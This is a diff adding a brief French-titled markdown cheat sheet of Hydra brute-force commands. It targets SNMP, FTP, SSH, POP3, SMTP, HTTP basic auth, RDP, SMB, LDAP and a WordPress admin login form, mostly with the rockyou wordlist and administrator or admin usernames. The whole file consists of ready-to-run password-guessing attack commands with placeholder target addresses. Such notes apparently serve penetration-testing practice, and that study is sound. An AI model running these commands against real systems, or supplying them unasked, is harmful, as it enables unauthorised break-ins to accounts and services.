@@ -1,0 +1,21 @@
+## Note sur l'utilisation de hydra ##
+
+BruteForce SNMP :
+  hydra -P password-file.txt -v adresse_ip snmp
+  
+BruteForce FTP : 
+  hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV adresse_ip ftp
+
+BruteForce SSH :
+  hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u adresse_ip ssh
+
+BruteForce POP3 : 
+  hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f adresse_ip pop3 -V
+
+hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V	Hydra SMTP Brute Force
+hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin	Hydra attack http get 401 login with a dictionary
+hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip	Hydra attack Windows Remote Desktop with rockyou
+hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb	Hydra brute force SMB user with rockyou:
+hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'	Hydra brute force a Wordpress admin login
+hydra -L usernames.txt -P passwords.txt $ip smb -V -f	SMB Brute Forcing
+hydra -L users.txt -P passwords.txt $ip ldap2 -V -f	LDAP Brute Forcing
